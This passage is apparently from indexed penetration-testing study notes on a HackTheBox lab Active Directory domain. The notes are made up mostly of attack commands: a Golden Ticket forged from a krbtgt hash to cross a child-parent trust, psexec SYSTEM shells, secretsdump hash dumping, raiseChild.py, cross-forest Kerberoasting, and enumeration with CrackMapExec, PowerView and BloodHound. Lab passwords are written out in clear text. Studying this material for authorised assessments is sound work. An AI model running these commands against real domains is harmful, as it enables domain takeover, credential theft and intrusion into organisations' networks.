LOGISTICS/krbtgt\n</code></pre> <p>Next, we can use lookupsid.py from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format DOMAIN_SID-RID. For example, from the output below, we can see that the SID of the lab_adm user would be S-1-5-21-2806153819-209893948-922872689-1001.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#performing-sid-brute-forcing-using-lookupsidpy","title":"Performing SID Brute Forcing using lookupsid.py","text":"<pre><code>$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \n\n$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep \"Domain SID\"\n</code></pre> <p>Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5 and grab the domain SID S-1-5-21-3842939050-3880317879-2865463114 and attach the RID of the Enterprise Admins group. Here is a handy list of well-known SIDs.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#grabbing-the-domain-sid-attaching-to-enterprise-admins-rid","title":"Grabbing the Domain SID &amp; Attaching to Enterprise Admin's RID","text":"<pre><code>$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 \"Enterprise Admins\"\n</code></pre> <p>Next, we can use ticketer.py from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by -domain-sid) and the parent domain (specified by -extra-sid).</p> <pre><code>$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker\n</code></pre> <p>The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials. Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#setting-the-krb5ccname-environment-variable","title":"Setting the KRB5CCNAME Environment Variable","text":"<pre><code>$ export KRB5CCNAME=hacker.ccache \n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#getting-a-system-shell-using-impackets-psexecpy","title":"Getting a SYSTEM shell using Impacket's psexec.py","text":"<pre><code>$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#dump-ntlm-hashes","title":"Dump NTLM Hashes","text":"<pre><code>$ secretsdump.py hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-ntlm -just-dc-user bross\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#performing-the-attack-with-raisechildpy","title":"Performing the Attack with raiseChild.py","text":"<pre><code>$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm\n</code></pre> <p>Though tools such as raiseChild.py can be handy and save us time, it is essential to understand the process and be able to perform the more manual version by gathering all of the required data points. In this case, if the tool fails, we are more likely to understand why and be able to troubleshoot what is missing, which we would not be able to if blindly running this tool. In a client production environment, we should always be careful when running any sort of \"autopwn\" script like this, and always remain cautious and construct commands manually when possible. Other tools exist which can take in data from a tool such as BloodHound, identify attack paths, and perform an \"autopwn\" function that can attempt to perform each action in an attack chain to elevate us to Domain Admin (such as a long ACL attack path). I would recommend avoiding tools such as these and work with tools that you understand fully, and will also give you the greatest degree of control throughout the process.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/","title":"Attacking Domain Trusts - Cross-Forest Trust Abuse","text":""},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#windows","title":"Windows","text":""},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#cross-forest-kerberoasting","title":"Cross-Forest Kerberoasting","text":"<p>Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.</p> <p>We can utilize PowerView to enumerate accounts in a target domain that have SPNs associated with them.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#enumerating-accounts-for-associated-spns-using-get-domainuser","title":"Enumerating Accounts for Associated SPNs Using Get-DomainUser","text":"<pre><code>PS &gt; Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#enumerating-the-mssqlsvc-account","title":"Enumerating the mssqlsvc Account","text":"<pre><code>PS &gt; Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof\n</code></pre> <p>Let's perform a Kerberoasting attack across the trust using Rubeus. We run the tool as we did in the Kerberoasting section, but we include the /domain: flag and specify the target domain.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#performing-a-kerberoasting-attacking-with-rubeus-using-domain-flag","title":"Performing a Kerberoasting Attacking with Rubeus Using /domain Flag","text":"<pre><code>PS &gt; .\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap\n</code></pre> <p>We could then run the hash through Hashcat. If it cracks, we've now quickly expanded our access to fully control two domains by leveraging a pretty standard attack and abusing the authentication direction and setup of the bidirectional forest trust.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#admin-password-re-use-group-membership","title":"Admin Password Re-Use &amp; Group Membership","text":"<p>From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account (or an account that is part of the Enterprise Admins or Domain Admins group in Domain A), and Domain B has a highly privileged account with the same name, then it is worth checking for password reuse across the two forests. I occasionally ran into issues where, for example, Domain A would have a user named adm_bob.smith in the Domain Admins group, and Domain B had a user named bsmith_admin. Sometimes, the user would be using the same password in the two domains, and owning Domain A instantly gave me full admin rights to Domain B.</p> <p>We may also see users or admins from Domain A as members of a group in Domain B. Only Domain Local Groups allow security principals from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.</p> <p>We can use the PowerView function Get-DomainForeignGroupMember to enumerate groups with users that do not belong to the domain, also known as foreign group membership. Let's try this against the FREIGHTLOGISTICS.LOCAL domain with which we have an external bidirectional forest trust.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#using-get-domainforeigngroupmember","title":"Using Get-DomainForeignGroupMember","text":"<pre><code>PS &gt; Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL\nPS &gt; Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#accessing-dc03-using-enter-pssession","title":"Accessing DC03 Using Enter-PSSession","text":"<pre><code>PS &gt; Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\\administrator\n</code></pre> <p>From the command output above, we can see that we successfully authenticated to the Domain Controller in the FREIGHTLOGISTICS.LOCAL domain using the Administrator account from the INLANEFREIGHT.LOCAL domain across the bidirectional forest trust. This can be a quick win after taking control of a domain and is always worth checking for if a bidirectional forest trust situation is present during an assessment and the second forest is in-scope.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#linux","title":"Linux","text":"<p>If this is possible in the environment we are assessing, we can perform this with GetUserSPNs.py from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the -target-domain flag in our command. Performing this against the FREIGHTLOGISTICS.LOCAL domain, we see one SPN entry for the mssqlsvc account.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#cross-forest-kerberoasting_1","title":"Cross-Forest Kerberoasting","text":""},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#using-getuserspnspy","title":"Using GetUserSPNs.py","text":"<pre><code>$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley\n</code></pre> <p>transporter@4 Rerunning the command with the -request flag added gives us the TGS ticket. We could also add -outputfile  to output directly into a file that we could then turn around and run Hashcat against."},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#using-the-request-flag","title":"Using the -request Flag","text":"<pre><code>$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  \n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#hunting-foreign-group-membership-with-bloodhound-python","title":"Hunting Foreign Group Membership with Bloodhound-python","text":"<p>As noted in the last section, we may, from time to time, see users or admins from one domain as members of a group in another domain. Since only Domain Local Groups allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship. If we are testing from a Linux host, we can gather this information by using the Python implementation of BloodHound. We can use this tool to collect data from multiple domains, ingest it into the GUI tool and search for these relationships.</p> <p>On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. We will be on an attack host without DNS configured in other instances. In this case, we would need to edit our resolv.conf file to run this tool since it requires a DNS hostname for the target Domain Controller instead of an IP address. We can edit the file as follows using sudo rights. Here we have commented out the current nameserver entries and added the domain name and the IP address of ACADEMY-EA-DC01 as the nameserver.</p> <pre><code>$ cat /etc/resolv.conf \n\ndomain INLANEFREIGHT.LOCAL\nnameserver 172.16.5.5\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#connect-to","title":"Connect to","text":"<pre><code>psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.inlanefreight.local -target-ip 172.16.5.238\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#running-bloodhound-python-against-inlanefreightlocal","title":"Running bloodhound-python Against INLANEFREIGHT.LOCAL","text":"<pre><code>$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#compressing-the-file-with-zip-r","title":"Compressing the File with zip -r","text":"<pre><code>$ zip -r ilfreight_bh.zip *.json\n</code></pre> <p>We will repeat the same process, this time filling in the details for the FREIGHTLOGISTICS.LOCAL domain.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#adding-freightlogisticslocal-information-to-etcresolvconf","title":"Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf","text":"<pre><code>$ cat /etc/resolv.conf \n\ndomain FREIGHTLOGISTICS.LOCAL\nnameserver 172.16.5.238\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/#running-bloodhound-python-against-freightlogisticslocal","title":"Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL","text":"<pre><code>$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2\n</code></pre> <p>After uploading the second set of data (either each JSON file or as one zip file), we can click on Users with Foreign Domain Group Membership under the Analysis tab and select the source domain as INLANEFREIGHT.LOCAL. Here, we will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/DomainTrusts/","title":"Domain Trusts","text":""},{"location":"old/old_ActiveDirectory/DomainTrusts/DomainTrusts/#enumerating-trust-relationships","title":"Enumerating Trust Relationships","text":""},{"location":"old/old_ActiveDirectory/DomainTrusts/DomainTrusts/#using-get-adtrust","title":"Using Get-ADTrust","text":"<pre><code>PS &gt; Import-Module activedirectory\nPS &gt; Get-ADTrust -Filter *\n</code></pre> <p>Aside from using built-in AD tools such as the Active Directory PowerShell module, both PowerView and BloodHound can be utilized to enumerate trust relationships, the type of trusts established, and the authentication flow. After importing PowerView, we can use the Get-DomainTrust function to enumerate what trusts exist, if any.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/DomainTrusts/#checking-for-existing-trusts-using-get-domaintrust","title":"Checking for Existing Trusts using Get-DomainTrust","text":"<pre><code>PS &gt; Get-DomainTrust \n</code></pre> <p>PowerView can be used to perform a domain trust mapping and provide information such as the type of trust (parent/child, external, forest) and the direction of the trust (one-way or bidirectional). This information is beneficial once a foothold is obtained, and we plan to compromise the environment further.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/DomainTrusts/#using-get-domaintrustmapping","title":"Using Get-DomainTrustMapping","text":"<pre><code>PS &gt; Get-DomainTrustMapping\n</code></pre> <p>From here, we could begin performing enumeration across the trusts. For example, we could look at all users in the child domain:</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/DomainTrusts/#checking-users-in-the-child-domain-using-get-domainuser","title":"Checking Users in the Child Domain using Get-DomainUser","text":"<pre><code>PS &gt; Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/DomainTrusts/#using-netdom-to-query-domain-trust","title":"Using netdom to query domain trust","text":"<pre><code>&gt; netdom query /domain:inlanefreight.local trust\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/DomainTrusts/#using-netdom-to-query-domain-controllers","title":"Using netdom to query domain controllers","text":"<pre><code>&gt; netdom query /domain:inlanefreight.local dc\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/DomainTrusts/#using-netdom-to-query-workstations-and-servers","title":"Using netdom to query workstations and servers","text":"<pre><code>&gt; netdom query /domain:inlanefreight.local workstation\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/DomainTrusts/#visualizing-trust-relationships-in-bloodhound","title":"Visualizing Trust Relationships in BloodHound","text":"<p>We can also use BloodHound to visualize these trust relationships by using the Map Domain Trusts pre-built query. Here we can easily see that two bidirectional trusts exist.</p>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/","title":"Credentialed Enumeration","text":""},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#linux","title":"Linux","text":""},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#crackmapexec-httpsgithubcombyt3bl33d3rcrackmapexec","title":"CrackMapExec [https://github.com/byt3bl33d3r/CrackMapExec]","text":"<pre><code>$ crackmapexec -h\n</code></pre> <p>MSSQL, SMB, SSH, and WinRM credentials</p>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#cme-options-smb","title":"CME Options (SMB)","text":"<pre><code>$ crackmapexec smb -h\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#cme-domain-user-enumeration","title":"CME - Domain User Enumeration","text":"<p>We start by pointing CME at the Domain Controller.</p> <pre><code>$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#cme-domain-group-enumeration","title":"CME - Domain Group Enumeration","text":"<pre><code>$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#cme-logged-on-users","title":"CME - Logged On Users","text":"<pre><code>$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#cme-share-searching","title":"CME Share Searching","text":"<pre><code>$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#spider_plus","title":"Spider_plus","text":"<pre><code>$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#smbmap-httpsgithubcomshawndevanssmbmap","title":"SMBMap [https://github.com/ShawnDEvans/smbmap]","text":""},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#smbmap-to-check-access","title":"SMBMap To Check Access","text":"<pre><code>$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#recursive-list-of-all-directories","title":"Recursive List Of All Directories","text":"<pre><code>$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#rpcclient-httpswwwsambaorgsambadocscurrentman-htmlrpcclient1html","title":"rpcclient [https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html]","text":"<pre><code>$ rpcclient -U \"\" -N 172.16.5.5\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#enumdomusers","title":"Enumdomusers","text":"<pre><code>rpcclient $&gt; enumdomusers\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#rpcclient-user-enumeration-by-rid","title":"RPCClient User Enumeration By RID","text":"<pre><code>rpcclient $&gt; queryuser 0x457\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#impacket-toolkit","title":"Impacket Toolkit","text":""},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#psexecpy-httpsgithubcomsecureauthcorpimpacketblobmasterexamplespsexecpy","title":"Psexec.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py]","text":"<p>To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.</p> <pre><code>$ psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  \n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#using-wmiexecpy-httpsgithubcomsecureauthcorpimpacketblobmasterexampleswmiexecpy","title":"Using wmiexec.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py]","text":"<pre><code>$ wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  \n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#windapsearch","title":"Windapsearch","text":""},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#windapsearch-domain-admins","title":"Windapsearch - Domain Admins","text":"<pre><code>$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#windapsearch-privileged-users","title":"Windapsearch - Privileged Users","text":"<pre><code>$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#bloodhoundpy-httpsgithubcomfox-itbloodhoundpy","title":"Bloodhound.py [https://github.com/fox-it/BloodHound.py]","text":"<p>Once we have domain credentials, we can run the BloodHound.py BloodHound ingestor from our Linux attack host. BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers. We can take large amounts of data that would be time-consuming to sift through and create graphical representations or \"attack paths\" of where access with a particular user may lead. We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues. The tool uses graph theory to visually represent relationships and uncover attack paths that would have been difficult, or even impossible to detect with other tools. The tool consists of two parts: the SharpHound collector written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using Cypher language. The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.</p> <pre><code>$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all \n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#upload-the-zip-file-into-the-bloodhound-gui","title":"Upload the Zip File into the BloodHound GUI","text":"<pre><code>$ sudo neo4j start\n$ zip -r ilfreight_bh.zip *.json\n\n$ bloodhound \n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#windows","title":"Windows","text":""},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#activedirectory-powershell-module","title":"ActiveDirectory PowerShell Module","text":"<pre><code>PS &gt; Get-Module\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#load-activedirectory-module","title":"Load ActiveDirectory Module","text":"<pre><code>PS &gt; Import-Module ActiveDirectory\nPS &gt; Get-Module\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#get-domain-info","title":"Get Domain Info","text":"<pre><code>PS &gt; Get-ADDomain\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#get-aduser","title":"Get-ADUser","text":"<pre><code>PS &gt; Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#checking-for-trust-relationships","title":"Checking For Trust Relationships","text":"<pre><code>PS &gt; Get-ADTrust -Filter *\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#group-enumeration","title":"Group Enumeration","text":"<pre><code>PS &gt; Get-ADGroup -Filter * | select name\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#detailed-group-info","title":"Detailed Group Info","text":"<pre><code>PS &gt; Get-ADGroup -Identity \"Backup Operators\"\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#group-membership","title":"Group Membership","text":"<pre><code>PS &gt; Get-ADGroupMember -Identity \"Backup Operators\"\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#powerview-httpsgithubcompowershellmafiapowersploitblobmasterreconpowerviewps1","title":"PowerView [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1]","text":""},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#domain-user-information","title":"Domain User Information","text":"<pre><code>PS &gt; Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#recursive-group-membership","title":"Recursive Group Membership","text":"<pre><code>PS &gt;  Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#trust-enumeration","title":"Trust Enumeration","text":"<pre><code>PS C:\\htb&gt; Get-DomainTrustMapping\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#testing-for-local-admin-access","title":"Testing for Local Admin Access","text":"<pre><code>PS C:\\htb&gt; Test-AdminAccess -ComputerName ACADEMY-EA-MS01\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#finding-users-with-spn-set","title":"Finding Users With SPN Set","text":"<pre><code>PS C:\\htb&gt; Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#sharpview-httpsgithubcomdmchellsharpview","title":"SharpView [https://github.com/dmchell/SharpView]","text":"<pre><code>PS C:\\htb&gt; .\\SharpView.exe Get-DomainUser -Identity forend\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#snaffler-httpsgithubcomsnaffconsnaffler","title":"Snaffler [https://github.com/SnaffCon/Snaffler]","text":"<p>Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.</p> <pre><code>PS C:\\htb&gt; .\\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#sharphound-httpsgithubcombloodhoundadbloodhoundtreemastercollectors","title":"SharpHound [https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors]","text":"<pre><code>PS C:\\htb&gt; .\\SharpHound.exe -c All --zipfilename ILFREIGHT\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#bloodhound-httpsgithubcombloodhoundadbloodhound","title":"BloodHound [https://github.com/BloodHoundAD/BloodHound]","text":""},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#living-off-the-land","title":"Living Off the Land","text":""},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#quick-checks-using-powershell","title":"Quick Checks Using PowerShell","text":"<pre><code>PS C:\\htb&gt; Get-Module\nPS C:\\htb&gt; Get-ExecutionPolicy -List\nPS C:\\htb&gt; Get-ChildItem Env: | ft key,value\n\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#downgrade-powershell","title":"Downgrade Powershell","text":"<pre><code>PS C:\\htb&gt; Get-host\nPS C:\\htb&gt; powershell.exe -version 2\nPS C:\\htb&gt; Get-host\nPS C:\\htb&gt; get-module\n\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#checking-defenses","title":"Checking Defenses","text":""},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#firewall-checks","title":"Firewall Checks","text":"<pre><code>PS C:\\htb&gt; netsh advfirewall show allprofiles\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#windows-defender-check-from-cmdexe","title":"Windows Defender Check (from CMD.exe)","text":"<pre><code>C:\\htb&gt; sc query windefend\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#get-mpcomputerstatus","title":"Get-MpComputerStatus","text":"<pre><code>PS C:\\htb&gt; Get-MpComputerStatus\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#am-i-alone","title":"Am I Alone?","text":""},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#using-qwinsta","title":"Using qwinsta","text":"<pre><code>PS C:\\htb&gt; qwinsta\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#network-information","title":"Network Information","text":"Networking Commands Description arp -a Lists all known hosts stored in the arp table. ipconfig /all Prints out adapter settings for the host. We can figure out the network segment from here. route print Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host. netsh advfirewall show state Displays the status of the host's firewall. We can determine if it is active and filtering traffic."},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#using-arp-a","title":"Using arp -a","text":"<pre><code>PS C:\\htb&gt; arp -a\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#viewing-the-routing-table","title":"Viewing the Routing Table","text":"<pre><code>PS C:\\htb&gt; route print\n</code></pre> <p><code>Using arp -a and route print will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.</code></p>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#windows-management-instrumentation-wmi","title":"Windows Management Instrumentation (WMI)","text":""},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#quick-wmi-checks","title":"Quick WMI checks","text":"Command Description wmic qfe get Caption,Description,HotFixID,InstalledOn  Prints the patch level and description of the Hotfixes applied wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List Displays basic host information to include any attributes within the list wmic process list /format:list A listing of all processes on host wmic ntdomain list /format:list    Displays information about the Domain and Domain Controllers wmic useraccount list /format:list Displays information about all local accounts and any domain accounts that have logged into the device wmic group list /format:list   Information about all local groups wmic sysaccount list /format:list  Dumps information about any system accounts that are being used as service accounts."},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#net-commands","title":"Net Commands","text":"Command Description net accounts Information about password requirements net accounts /domain Password and lockout policy net group /domain Information about domain groups net group \"Domain Admins\" /domain List users with domain admin privileges net group \"domain 